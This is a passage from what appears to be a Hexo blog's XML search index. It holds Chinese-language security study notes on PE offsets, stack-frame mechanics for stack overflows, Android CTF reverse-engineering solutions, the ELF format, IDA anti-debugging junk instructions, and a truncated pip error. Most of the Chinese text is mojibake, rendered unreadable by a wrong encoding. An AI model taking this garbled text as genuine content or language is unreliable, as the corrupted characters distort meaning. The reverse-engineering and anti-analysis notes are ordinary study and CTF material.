PEæ–‡ä»¶ä¸­çš„æ•°æ®åœ¨æœªè£…è½½å…¥å†…å­˜ä¹‹å‰ï¼ŒæŒ‰ç…§ç£ç›˜æ•°æ®å­˜æ”¾ï¼Œä»¥0X200å­—èŠ‚ä¸ºå•ä½ã€‚å½“ä¸€ä¸ªæ•°æ®èŠ‚(section)ä¸è¶³0X200æ—¶ï¼Œä¸è¶³çš„éƒ¨åˆ†å°†è¢«0X00å¡«å……ã€‚æ‰€ä»¥PEæ•°æ®èŠ‚çš„å¤§å°æ°¸è¿œæ˜¯0X200çš„æ•´æ•°å€ã€‚ PEæ–‡ä»¶ä¸­çš„æ•°æ®è¢«è£…è½½å…¥å†…å­˜ä¹‹åŽï¼ŒæŒ‰ç…§å†…å­˜æ•°æ®çš„æ ‡å‡†ä»¥0X1000ä¸ºå•ä½è¿›è¡Œå­˜æ”¾ï¼Œæ‰€ä»¥å†…å­˜ä¸­çš„æ•°æ®èŠ‚å¤§å°æ°¸è¿œæ˜¯0X1000çš„æ•´æ•°å€ã€‚ ç”±äºŽæ•°æ®åœ¨PEæ–‡ä»¶å’Œå†…å­˜ä¸­çš„å­˜å‚¨å•ä½ä¸åŒï¼Œæ‰€ä»¥æ–‡ä»¶åç§»å’ŒRVAåªæ˜¯â€æœ‰å¾ˆå¤§çš„ä¸€è‡´æ€§â€ã€‚ç”±äºŽä¸Šè¿°å·®å¼‚ï¼Œè¿›è¡Œæ–‡ä»¶åç§»åˆ°è™šæ‹Ÿå†…å­˜åœ°å€ä¹‹é—´çš„è½¬æ¢è¦çœ‹æ‰€è½¬æ¢çš„åœ°å€å±žäºŽç¬¬å‡ ä¸ªèŠ‚å†…(åœ¨æ•°æ®èŠ‚çš„å‰é¢è¿˜æ˜¯åŽé¢)ã€‚ æ–‡ä»¶åç§»åœ°å€=è™šæ‹Ÿå†…å­˜åœ°å€VA-è£…è½½åŸºå€(Image Base)-èŠ‚åç§»=RVA-èŠ‚åç§»ã€‚ 0X01:æ ˆæº¢å‡ºåŽŸç†ä¸Žå®žæˆ˜å†…å­˜å››åŒº(æ³¨æ„æ˜¯å†…å­˜ä¸æ˜¯PEæ–‡ä»¶)ï¼š ä»£ç åŒºï¼šå­˜å‚¨è¢«è£…å…¥æ‰§è¡Œçš„äºŒè¿›åˆ¶æœºå™¨ä»£ç ï¼ŒCPUä»Žè¿™ä¸ªåŒºåŸŸå–æŒ‡ä»¤æ‰§è¡Œã€‚ æ•°æ®åŒºï¼šå­˜å‚¨å…¨å±€å˜é‡ç­‰ã€‚ å †åŒºï¼šè¿›ç¨‹åœ¨å †åŒºåŠ¨æ€åœ°è¯·æ±‚ä¸€å®šå¤§å°çš„å†…å­˜ï¼Œå¹¶åœ¨ç”¨å®Œä¹‹åŽfreeã€‚åŠ¨æ€åœ°åˆ†é…å’Œå›žæ”¶æ˜¯å †åŒºçš„ç‰¹ç‚¹ã€‚ æ ˆåŒºï¼šç”¨äºŽåŠ¨æ€åœ°å­˜å‚¨å‡½æ•°ä¹‹é—´çš„è°ƒç”¨å…³ç³»ã€‚ ç³»ç»Ÿæ ˆæ˜¯å¯¹å†…å­˜ä¸­æ‰€æœ‰æ ˆçš„ç»Ÿç§°ï¼Œæ ˆå¸§æ˜¯æŒ‡ä¸€ä¸ªå‡½æ•°å¼€è¾Ÿå‡ºçš„æ ˆç©ºé—´ã€‚ä¸¥æ ¼æ¥è¯´ï¼Œæ ˆå¸§åº•éƒ¨å’Œæ ˆåº•éƒ¨ä¸æ˜¯åŒä¸€æ¦‚å¿µã€‚æ‰€ä»¥åœ¨å¯¹EBPè¿›è¡Œè¯´æ˜Žæ—¶ï¼šå®ƒæŒ‡å‘å½“å‰ä½äºŽç³»ç»Ÿæ ˆæœ€ä¸Šè¾¹ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿæ ˆçš„åº•éƒ¨ã€‚ESPæ‰€æŒ‡çš„æ ˆå¸§åº•éƒ¨ä¸Žç³»ç»Ÿæ ˆåº•éƒ¨æ˜¯åŒä¸€ä½ç½®ã€‚ åœ¨å‡½æ•°æ ˆå¸§ä¸­ï¼ŒåŒ…å«ï¼š å±€éƒ¨å˜é‡ï¼šä¸ºå‡½æ•°å±€éƒ¨å˜é‡å¼€è¾Ÿçš„å†…å­˜ç©ºé—´ã€‚ æ ˆå¸§çŠ¶æ€å€¼ï¼šä¿å­˜å‰æ ˆå¸§çš„é¡¶éƒ¨å’Œåº•éƒ¨(å®žé™…ä¸Šåªä¿å­˜åº•éƒ¨ï¼Œå‰æ ˆå¸§çš„é¡¶éƒ¨å¯ä»¥é€šè¿‡å †æ ˆå¹³è¡¡è®¡ç®—å¾—åˆ°ï¼Ÿã€‚)ï¼Œç”¨äºŽåœ¨æœ¬æ ˆå¸§è¢«å¼¹å‡ºåŽæ¢å¤ä¸Šä¸€ä¸ªæ ˆå¸§ã€‚ å‡½æ•°è¿”å›žåœ°å€ï¼šä¿å­˜å½“å‰å‡½æ•°è°ƒç”¨å‰çš„EIPä¿¡æ¯(ä¸å‡†ç¡®ï¼Ÿ)å°±æ˜¯å‡½æ•°è°ƒç”¨å‰çš„æŒ‡ä»¤ä½ç½®ï¼Œå³å‡½æ•°è°ƒç”¨å‰çš„æŒ‡ä»¤ä½ç½®ï¼Œè¿™æ ·å‡½æ•°è¿”å›žæ—¶èƒ½å¤Ÿæ¢å¤åˆ°å‡½æ•°è¢«è°ƒç”¨å‰çš„ä»£ç åŒºä¸­ç»§ç»­æ‰§è¡ŒæŒ‡ä»¤ã€‚ å‡½æ•°çš„æ ˆå¸§å¤§å°å¹¶ä¸ç¡®å®šï¼Œä¸Žå…¶å¯¹åº”çš„å±€éƒ¨å˜é‡çš„å¤šå°‘æœ‰å…³ã€‚åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ä¹Ÿèƒ½å‘çŽ°ï¼Œåœ¨å‡½æ•°è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå…¶æ ˆå¸§å¤§å°ä¹Ÿåœ¨ä¸æ–­å˜åŒ–ã€‚ å‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š å‚æ•°å…¥æ ˆï¼šå°†å‚æ•°ä»Žå³å‘å·¦ä¾æ¬¡åŽ‹å…¥ç³»ç»Ÿæ ˆä¸­ã€‚ è¿”å›žåœ°å€å…¥æ ˆï¼šå°†å½“å‰ä»£ç åŒºè°ƒç”¨æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åŽ‹å…¥æ ˆä¸­ï¼Œå¾…å‡½æ•°è¿”å›žæ—¶popå‡ºè¿”å›žåœ°å€ä¸ºEIPæŒ‡å‘ç»§ç»­æ‰§è¡Œã€‚ ä»£ç åŒºè·³è½¬ï¼šå¤„ç†å™¨ä»Žå½“å‰ä»£ç åŒºè·³è½¬åˆ°è¢«è°ƒç”¨å‡½æ•°çš„å…¥å£å¤„ã€‚ æ ˆå¸§è°ƒæ•´ï¼š PUSH EBP(ä¿å­˜å½“å‰æ ˆå¸§çŠ¶æ€å€¼ï¼Œå¤‡åŽé¢å›žå¤æœ¬æ ˆå¸§æ—¶ä½¿ç”¨) MOV EBP,ESP(å°†å½“å‰æ ˆå¸§åˆ‡æ¢åˆ°æ–°æ ˆå¸§ï¼Œæ›´æ–°æ ˆå¸§åº•éƒ¨) SUB ESP,XXX(ç»™æ–°æ ˆå¸§åˆ†é…ç©ºé—´,æŠ¬é«˜æ ˆé¡¶) å‡½æ•°çš„è¿”å›žè¿‡ç¨‹åŒ…å«å¦‚ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š ä¿å­˜è¿”å›žå€¼ï¼šé€šå¸¸å°†å‡½æ•°çš„è¿”å›žå€¼ä¿å­˜åœ¨å¯„å­˜å™¨EAXä¸­ å¼¹å‡ºå½“å‰æ ˆå¸§ï¼Œæ¢å¤ä¸Šä¸€ä¸ªæ ˆå¸§ï¼Œå…·ä½“å¦‚ä¸‹ï¼š åœ¨å †æ ˆå¹³è¡¡çš„åŸºç¡€ä¸Šï¼Œç»™ESPåŠ ä¸Šæ ˆå¸§çš„å¤§å°ï¼Œé™ä½Žæ ˆé¡¶ï¼Œå›žæ”¶å½“å‰çš„æ ˆç©ºé—´ã€‚ å°†å½“å‰æ ˆå¸§åº•éƒ¨ä¿å­˜çš„å‰æ ˆå¸§EBPå€¼å¼¹å…¥EBPå¯„å­˜å™¨ï¼Œæ¢å¤ä¸Šä¸€ä¸ªæ ˆå¸§ã€‚ å°†å‡½æ•°è¿”å›žåœ°å€å¼¹ç»™EIPå¯„å­˜å™¨ã€‚ 4.æœ€åŽä¸€æ­¥â€”â€”è·³è½¬ï¼šæŒ‰ç…§å‡½æ•°è¿”å›žåœ°å€è·³å›žæ¯å‡½æ•°ä¸­ç»§ç»­æ‰§è¡Œã€‚ æ³¨æ„CALLæŒ‡ä»¤å’ŒRETNæŒ‡ä»¤çš„å®žé™…æ“ä½œ æˆ‘çš„è¯¯åŒºï¼š è¿”å›žåœ°å€å’ŒEBPå¹¶ä¸æ˜¯åŒä¸€æ¦‚å¿µä¸ŽåŠŸèƒ½ã€‚CALLæŒ‡ä»¤ä¹‹åŽï¼Œå…ˆå°†è¿”å›žåœ°å€åŽ‹å…¥æ ˆä¸­å†PUSH EBP(æ—§æ ˆå¸§)ï¼ŒEBPå¯¹å‡½æ•°è¿”å›žå¹¶æ— ä»»ä½•è´¡çŒ®ã€‚ MOV EBP,ESPæŒ‡ä»¤å¹¶ä¸ä¼šå¯¹å·²ç»å­˜æ”¾åœ¨æ ˆä¸­çš„EBPçš„å€¼è¿›è¡Œæ”¹å˜ï¼Œæ˜¯å¯¹å¯„å­˜å™¨EBPçš„å€¼è¿›è¡Œæ”¹å˜ã€‚æ³¨æ„å½“å‰æ ˆå¸§ä¿å­˜çš„EBPå€¼æ°¸è¿œæ˜¯å‰æ ˆå¸§çš„EBPã€‚ åŽ‹å…¥æ ˆä¸­çš„EBPç›®çš„åœ¨äºŽä½¿æ‰§è¡Œå®Œå‡½æ•°åŽï¼Œæ ˆåº•æ¢å¤åˆ°ä¸Šä¸€ä¸ªçŠ¶æ€ã€‚åŽ‹å…¥æ ˆä¸­çš„è¿”å›žåœ°å€ç›®çš„åœ¨äºŽä½¿æ‰§è¡Œå®Œå‡½æ•°åŽï¼ŒEIPæ¢å¤åˆ°å‡½æ•°è°ƒç”¨å‰çš„çŠ¶æ€ï¼Œç»§ç»­æ²¿mainå‡½æ•°æ‰§è¡Œ å…³äºŽæ ˆå¸§çš„åˆ’åˆ†ï¼Œåœ¨ä¸åŒä¹¦ä¸­æœ‰ä¸åŒçš„çº¦å®šã€‚æœ¬ä¹¦ä¸­åšæŒæ ˆå¸§åº•éƒ¨å­˜æ”¾å‰æ ˆå¸§EBP,æ ˆå¸§é¡¶éƒ¨å­˜æ”¾è¿”å›žåœ°å€ã€‚ åœ¨è§‚å¯Ÿå†…å­˜çš„æ—¶å€™åº”è¯¥æ³¨æ„â€å†…å­˜æ•°æ®â€ä¸Žâ€æ•°å€¼æ•°æ®â€çš„åŒºåˆ«ã€‚åœ¨è°ƒè¯•çŽ¯å¢ƒä¸­ï¼Œå†…å­˜ç”±ä½Žåˆ°é«˜åˆ†å¸ƒï¼Œå°±åƒWin32ç³»ç»Ÿåœ¨å†…å­˜ä¸­ç”±ä½Žä½å‘é«˜ä½å­˜å‚¨ä¸€ä¸ªå››å­—èŠ‚çš„åŒå­—(Dumpçª—å£çš„åå…­è¿›åˆ¶ä¸¤ä½)ï¼Œä½†æ˜¯åœ¨ä½œä¸ºâ€æ•°å€¼æ•°æ®â€åº”ç”¨çš„æ—¶å€™ï¼Œæ˜¯ç”±é«˜ä½å­—èŠ‚å‘ä½Žä½å­—èŠ‚è¿›è¡Œè§£é‡Šçš„ã€‚æ‰€ä»¥åœ¨è°ƒè¯•çŽ¯å¢ƒä¸­ï¼Œå†…å­˜æ•°æ®ä¸­çš„åŒå­—ä¸Žæˆ‘ä»¬é€šå¸¸ä½¿ç”¨çš„æ•°å€¼æ•°æ®æ˜¯ä»¥åŒå­—ä¸ºå•ä½é€†åºè¿‡çš„ã€‚å‡ºäºŽé˜…è¯»æ–¹ä¾¿ï¼ŒODå·²ç»è‡ªåŠ¨åœ¨æ ˆä¸­è¿›è¡Œäº†åè½¬ï¼Œåœ¨æ ˆçª—å£æ‰€çœ‹åˆ°çš„æ•°æ®æ˜¯æ•°å€¼æ•°æ®è€Œéžå†…å­˜æ•°æ®ã€‚æ‰€ä»¥åœ¨æ ˆå†…çœ‹æ•°æ®æ—¶ï¼Œä»Žå·¦å‘å³å¯¹äºŽå·¦è¾¹çš„åœ°å€åç§»ä¾æ¬¡ä¸º3ï¼Œ2ï¼Œ1ï¼Œ0.]]></content>
      <tags>
        <tag>0dayå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gitçš„å¤§å°å†™é—®é¢˜]]></title>
    <url>%2F2019%2F09%2F05%2FGit%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[ä½¿ç”¨ Hexo éƒ¨ç½²åšå®¢åˆ° Github Pages æ—¶ç»å¸¸ä¼šé‡åˆ°æ–‡ä»¶å¤¹å¤§å°å†™é—®é¢˜å¯¼è‡´çš„ 404é—®é¢˜ï¼Œå¦‚tagæ ‡ç­¾æ— æ³•è®¿é—®è¿”å›ž404ã€‚ åŽŸå›  git é»˜è®¤å¿½ç•¥æ–‡ä»¶åå¤§å°å†™ï¼Œæ‰€ä»¥å³ä½¿æ–‡ä»¶å¤¹å¤§å°å†™å˜æ›´ï¼Œgit ä¹Ÿæ£€æµ‹ä¸åˆ°ã€‚ è§£å†³åŠžæ³• è¿›å…¥åˆ°åšå®¢é¡¹ç›®ä¸­ .deploy_gitæ–‡ä»¶å¤¹ï¼Œä¿®æ”¹ .git ä¸‹çš„ config æ–‡ä»¶ï¼Œå°† ignorecase=true æ”¹ä¸º ignorecase=falseã€‚]]></content>
      <tags>
        <tag>æŠ¥é”™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºŽAndroidé€†å‘å…¥é—¨]]></title>
    <url>%2F2019%2F08%2F31%2FAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[å…³äºŽAndroidé€†å‘è§£é¢˜è¿‡ç¨‹çš„æ€»ç»“ 0X00:åŠŸèƒ½æµ‹è¯•é¦–å…ˆå°†APKæ–‡ä»¶æ‹–å…¥æ¨¡æ‹Ÿå™¨ä¸­ï¼Œæµ‹è¯•å…¶åŠŸèƒ½ï¼Œæ ¹æ®å¼¹å‡ºçš„å­—ç¬¦ä¸²ï¼Œå¯»æ‰¾è§£é¢˜çš„çªç ´å£ã€‚ 0X01:ä¸»æ´»åŠ¨é¦–å…ˆé€šè¿‡Androidmanifest.xmlçš„æ‰¾åˆ°Mainactivityï¼Œå†å¯¹å…¶ä¸­çš„ä»£ç è¿›è¡Œé€†å‘åˆ†æžã€‚ 0X02:ç‰¹æ®Šæƒ…å†µéšè—mainactivity 0X03:å‡ ç§å·¥å…·çš„ä¼˜åŠ¿èƒ½å¤Ÿæ˜¾ç¤ºå‡ºè¢«è°ƒç”¨è¿‡çš„å‡½æ•° 0X04:å…·ä½“é¢˜ç›®æ”»é˜²ä¸–ç•ŒAPP1ï¼š é¦–å…ˆç”¨jadxæ‰“å¼€ï¼Œå¯»æ‰¾åˆ°å…¶ä¸­çš„Androidmanifest.xmlï¼Œé€šè¿‡intent-filteræ‰¾åˆ°ä¸»æ´»åŠ¨ã€‚ å¯¹Javaä»£ç è¿›è¡Œåˆ†æž æ‰¾åˆ°å…³é”®ä»£ç  é€šè¿‡Buildconfigæ‰¾å¯èƒ½æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¦‚è¯¥é¢˜ä¸­çš„versionNameå’ŒversionCodeï¼Œåˆ†åˆ«ä¸ºX&lt;cP[?PHNB&lt;P?ajå’Œ15. charAt(i)å‡½æ•°ï¼Œè¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„ç¬¬iä¸ªæ•°å­—ã€‚å¯çŸ¥è¿™å¥ä»£ç çš„æ„æ€æ˜¯ï¼šå°†è¾“å…¥å­—ç¬¦ä¸²çš„ç¬¬1~iä¸ªå­—ç¬¦åˆ†åˆ«å’ŒversionCodeä¸ŽversionNameå¼‚æˆ–ä¹‹åŽçš„ç»“æžœè¿›è¡Œç›¸ç­‰æ¯”è¾ƒã€‚å¦‚æžœä¸ç›¸ç­‰çš„è¯ï¼Œè¾“å‡ºâ€å†æŽ¥å†åŽ‰ï¼ŒåŠ æ²¹ï¼â€ äºŽæ˜¯Pythonè„šæœ¬å¦‚ä¸‹ï¼š s=â€X&lt;cP[?PHNB&lt;P?ajâ€ flag=â€ â€œ for i in s: â€‹ flag+=chr(ord(i)^15)//å°†sä¸­çš„å­—ç¬¦é€ä¸ªè½¬åŒ–ä¸ºæ•°å­—ï¼Œä¸Ž15è¿›è¡Œå¼‚æˆ–åŽï¼Œå†ä»¥å­—ç¬¦å½¢å¼è¾“å‡ºã€‚ â€‹ print(flag) æ”»é˜²ä¸–ç•ŒApp2ï¼š è§‚å¯Ÿç¨‹åºåŠŸèƒ½ jadxæ‰“å¼€ ç”±ç¬¬ä¸€ä¸ªæ´»åŠ¨ä¼ åˆ°äº†ç¬¬äºŒä¸ªæ´»åŠ¨,è§‚å¯Ÿåˆ°ï¼š è¿›å…¥è¿™ä¸ªclass å¯è§æ˜¯nativeå±‚çš„è°ƒç”¨ äºŽæ˜¯æ”¹apkåŽç¼€ä¸ºzipå¯¹.soè¿›è¡Œåˆ†æžï¼Œæ‰¾åˆ°å…¶ä¸­çš„libï¼Œä»»æ„å¯¹å…¶ä¸­ä¸€é¡¹åˆ†æžã€‚ å¯è§æ˜¯AES thisisateatkey== ä½œä¸ºå¯†é’¥è§£å¯†å¾—ï¼š]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux ELF]]></title>
    <url>%2F2019%2F08%2F21%2FLinux-ELF%2F</url>
    <content type="text"><![CDATA[Linux å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ ELF ï¼ˆExecutable Linkable Formatï¼‰æ–‡ä»¶çš„ä¸‰ç§ç±»åž‹ï¼š å¯é‡å®šä½æ–‡ä»¶ï¼ˆRelocatable fileï¼‰ åŒ…å«äº†ä»£ç å’Œæ•°æ®ï¼Œå¯ä»¥å’Œå…¶ä»–ç›®æ ‡æ–‡ä»¶é“¾æŽ¥ç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«ç›®æ ‡æ–‡ä»¶ã€‚ elfDemo.o å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆExecutable Fileï¼‰ åŒ…å«äº†å¯ä»¥ç›´æŽ¥æ‰§è¡Œçš„æ–‡ä»¶ã€‚ elfDemo_static.out å…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆShared Object Fileï¼‰ åŒ…å«äº†ç”¨äºŽé“¾æŽ¥çš„ä»£ç å’Œæ•°æ®ï¼Œåˆ†ä¸¤ç§æƒ…å†µã€‚ä¸€ç§æ˜¯é“¾æŽ¥å™¨å°†å…¶ä¸Žå…¶ä»–çš„å¯é‡å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶é“¾æŽ¥èµ·æ¥ï¼Œç”Ÿäº§æ–°çš„ç›®æ ‡æ–‡ä»¶ã€‚å¦ä¸€ç§æ˜¯åŠ¨æ€é“¾æŽ¥å™¨å°†å¤šä¸ªå…±äº«ç›®æ ‡æ–‡ä»¶ä¸Žå¯æ‰§è¡Œæ–‡ä»¶ç»“åˆï¼Œä½œä¸ºè¿›ç¨‹æ˜ åƒçš„ä¸€éƒ¨åˆ†ã€‚ elfDemo.out libc-2.25.so å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿™ä¸ªç®€åŒ–çš„ ELF æ–‡ä»¶ä¸­ï¼Œå¼€å¤´æ˜¯ä¸€ä¸ªâ€œæ–‡ä»¶å¤´â€ï¼Œä¹‹åŽåˆ†åˆ«æ˜¯ä»£ç æ®µã€æ•°æ®æ®µå’Œ.bssæ®µã€‚ç¨‹åºæºä»£ç ç¼–è¯‘åŽï¼Œæ‰§è¡Œè¯­å¥å˜æˆæœºå™¨æŒ‡ä»¤ï¼Œä¿å­˜åœ¨.textæ®µï¼›å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡éƒ½ä¿å­˜åœ¨.dataæ®µï¼›æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡åˆ™æ”¾åœ¨.bssæ®µã€‚ æŠŠç¨‹åºæŒ‡ä»¤å’Œç¨‹åºæ•°æ®åˆ†å¼€å­˜æ”¾æœ‰è®¸å¤šå¥½å¤„ï¼Œä»Žå®‰å…¨çš„è§’åº¦è®²ï¼Œå½“ç¨‹åºè¢«åŠ è½½åŽï¼Œæ•°æ®å’ŒæŒ‡ä»¤åˆ†åˆ«è¢«æ˜ å°„åˆ°ä¸¤ä¸ªè™šæ‹ŸåŒºåŸŸã€‚ç”±äºŽæ•°æ®åŒºåŸŸå¯¹äºŽè¿›ç¨‹æ¥è¯´æ˜¯å¯è¯»å†™çš„ï¼Œè€ŒæŒ‡ä»¤åŒºåŸŸå¯¹äºŽè¿›ç¨‹æ¥è¯´æ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªè™šå­˜åŒºåŸŸçš„æƒé™å¯ä»¥è¢«åˆ†åˆ«è®¾ç½®æˆå¯è¯»å†™å’Œåªè¯»ï¼Œå¯ä»¥é˜²æ­¢ç¨‹åºçš„æŒ‡ä»¤è¢«æ”¹å†™å’Œåˆ©ç”¨ã€‚ ELF æ–‡ä»¶ç»“æž„ ELF æ–‡ä»¶å¤´ï¼ˆELF Headerï¼‰ åœ¨ç›®æ ‡æ–‡ä»¶æ ¼å¼çš„æœ€å‰é¢ï¼ŒåŒ…å«äº†æè¿°æ•´ä¸ªæ–‡ä»¶çš„åŸºæœ¬å±žæ€§ã€‚ ç¨‹åºå¤´è¡¨ï¼ˆProgram Header Tableï¼‰ æ˜¯å¯é€‰çš„ï¼Œå®ƒå‘Šè¯‰ç³»ç»Ÿæ€Žæ ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ˜ åƒã€‚å¯æ‰§è¡Œæ–‡ä»¶å¿…é¡»æœ‰ç¨‹åºå¤´è¡¨ï¼Œè€Œé‡å®šä½æ–‡ä»¶ä¸éœ€è¦ã€‚ æ®µï¼ˆSectionï¼‰ åŒ…å«äº†é“¾æŽ¥è§†å›¾ä¸­å¤§é‡çš„ç›®æ ‡æ–‡ä»¶ä¿¡æ¯ã€‚ æ®µè¡¨ï¼ˆSection Header Tableï¼‰ åŒ…å«äº†æè¿°æ–‡ä»¶ä¸­æ‰€æœ‰æ®µçš„ä¿¡æ¯ã€‚]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åé™æ€è°ƒè¯•]]></title>
    <url>%2F2019%2F07%2F21%2F%E5%8F%8D%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[åè°ƒè¯•ï¼šæ’å…¥ä»£ç ï¼Œè®©ç¨‹åºæ„è¯†åˆ°è‡ªå·±åœ¨è¢«è°ƒè¯•æ—¶ï¼Œæ‰§è¡Œä»£ç é˜»æ­¢è°ƒè¯•å™¨çš„åˆ†æžï¼Œå»¶é•¿è°ƒè¯•çš„æ—¶é—´ã€‚é€šè¿‡æ”¹å˜æ­£å¸¸çš„æ‰§è¡Œè·¯å¾„æˆ–è€…ä¿®æ”¹è‡ªèº«ç¨‹åºè®©è‡ªå·±å´©æºƒï¼Œä»Žè€Œå¢žåŠ è°ƒè¯•çš„æ—¶é—´å’Œå¤æ‚åº¦ã€‚ 0X00:IDAä¸­çš„ååè°ƒè¯•F5ä¹‹åŽIDAæŠ¥é”™ï¼Œçº¢è‰²æ˜¾ç¤ºï¼šâ€sp-analysis failedâ€(IDAæœ‰æ ˆè·Ÿè¸ªçš„åŠŸèƒ½ï¼Œå®ƒåœ¨å‡½æ•°å†…éƒ¨é‡åˆ°ret(retn)æŒ‡ä»¤æ—¶ä¼šåšåˆ¤æ–­ï¼šæ ˆæŒ‡é’ˆçš„å€¼åœ¨å‡½æ•°çš„å¼€å¤´/ç»“å°¾æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æžœä¸ä¸€è‡´å°±ä¼šåœ¨å‡½æ•°çš„ç»“å°¾æ ‡æ³¨â€sp-analysis failedâ€ã€‚),è¯´æ˜Žæ ˆæŒ‡é’ˆæœªå¹³è¡¡ã€‚é€šè¿‡â€Options-General-Disassembly-â€œStack pointerâ€æ˜¾ç¤ºå‡ºæ ˆæŒ‡é’ˆã€‚ä¹‹åŽAlt+Kè¿›è¡Œä¿®æ”¹ï¼Œå°†Callä¹‹å‰çš„æ ˆæŒ‡é’ˆå‡åŽ»0X04å°±å¾—åˆ°æ­£ç¡®çš„æ•°å€¼ã€‚ 0X01:èŠ±æŒ‡ä»¤æ’å…¥èŠ±æŒ‡ä»¤æˆ–è€…åžƒåœ¾ä»£ç å¯ä»¥ä¿æŠ¤è‡ªå·±çš„ä»£ç  asmçš„ä½œç”¨ï¼šç”¨äºŽè°ƒç”¨å†…è”æ±‡ç¼–ç¨‹åºï¼Œå¹¶ä¸”å¯åœ¨ C æˆ– C++ è¯­å¥åˆæ³•æ—¶å‡ºçŽ°ï¼Œ asmåŽè·Ÿä¸€ä¸ªç¨‹åºé›†æŒ‡ä»¤ã€ä¸€ç»„æ‹¬åœ¨å¤§æ‹¬å·ä¸­çš„æŒ‡ä»¤æˆ–è€…è‡³å°‘ä¸€å¯¹ç©ºå¤§æ‹¬å·ã€‚emitæŒ‡ä»¤çš„ä½œç”¨ï¼š ç¼–è¯‘å™¨ä¸è®¤è¯†çš„æŒ‡ä»¤ï¼Œæ‹†æˆæœºå™¨ç æ¥å†™ã€‚ æ’å…¥åžƒåœ¾å­—èŠ‚æ¥åè·Ÿè¸ªï¼Œåˆç§°èŠ±æŒ‡ä»¤ã€‚ __ams { â€‹ lea eax,lab1; â€‹ jmp eax; â€‹ _emit 0x90; } lab1: â€‹ printf(â€œfunc1\nâ€); 0X02ï¼šæŸäº›å‡½æ•°åœ¨ä½¿ç”¨ f5 è¿›è¡Œåç¼–è¯‘æ—¶ï¼Œä¼šæç¤ºé”™è¯¯ â€œsp-analysis failedâ€ï¼Œå¯¼è‡´æ— æ³•æ­£ç¡®åç¼–è¯‘ã€‚åŽŸå› å¯èƒ½æ˜¯åœ¨ä»£ç æ‰§è¡Œä¸­çš„ popã€push æ“ä½œä¸åŒ¹é…ï¼Œå¯¼è‡´è§£æžçš„æ—¶å€™ esp å‘ç”Ÿé”™è¯¯ã€‚ è§£å†³åŠžæ³•æ­¥éª¤å¦‚ä¸‹ï¼š ç”¨ Option-&gt;General-&gt;Disassembly, å°†é€‰é¡¹ Stack pointer æ‰“é’© ä»”ç»†è§‚å¯Ÿæ¯æ¡ call sub_xxxxxx å‰åŽçš„å †æ ˆæŒ‡é’ˆæ˜¯å¦å¹³è¡¡ æœ‰æ—¶è¿˜è¦çœ‹è¢«è°ƒç”¨çš„ sub_xxxxxx å†…éƒ¨çš„å †æ ˆæƒ…å†µï¼Œä¸»è¦æ˜¯çœ‹å…¥æ ˆçš„å‚æ•°ä¸Ž ret xx æ˜¯å¦åŒ¹é… æ³¨æ„è§‚å¯Ÿ jmp æŒ‡ä»¤å‰åŽçš„å †æ ˆæ˜¯å¦æœ‰å˜åŒ– æœ‰æ—¶ç”¨ Edit-&gt;Functions-&gt;Edit functionâ€¦,ç„¶åŽç‚¹å‡» OK åˆ·ä¸€ä¸‹å‡½æ•°å®šä¹‰]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python's error]]></title>
    <url>%2F2019%2F07%2F18%2FPython-s-error%2F</url>
    <content type="text"><![CDATA[æŠ¥é”™1:Exception:Traceback (most recent call last): File â€œ/usr/lib/python2.7/dist-packages/pip/basecommand.pyâ€, line 209, in main status = self.run(options, args) File â€œ/usr/lib/python2.7/dist-packages/pip/commands/install.pyâ€, line 328, in run wb.build(autobuilding=True) File â€œ/usr/lib/python2.7/dist-packages/pip/wheel.pyâ€, line 748, in build self.requirement_set.prepare_files(self.finder) File â€œ/usr/lib/python2.7/dist-packages/pip/req/req_set.pyâ€, line 360, in prepare_files ignore_dependencies=self.ignore_dependencies)) File â€œ/usr/lib/python2.7/dist-packages/pip/req/req_set.pyâ€, line 512, in _prepare_file finder, self.upgrade, require_hashes) File â€œ/usr/lib/python2.7/dist-packages/pip/req/req_install.pyâ€, line 273, in populate_link self.link = finder.find_requirement(self, upgrade) File â€œ/usr/lib/python2.7/dist-packages/pip/index.pyâ€, line 442, in find_requirement all_candidates = self.find_all_candidates(req.name) File â€œ/usr/lib/python2.7/dist-packages/pip/index.pyâ€, line 400, in find_all_candidates for page in self._get_pages(url_locations, project_name): File â€œ/usr/lib/python2.7/dist-packages/pip/index.pyâ€, line 545, in _get_pages page = self._get_page(location) File â€œ/usr/lib/python2.7/dist-packages/pip/index.pyâ€, line 648, in _get_page return HTMLPage.get_page(link, session=self.session) File 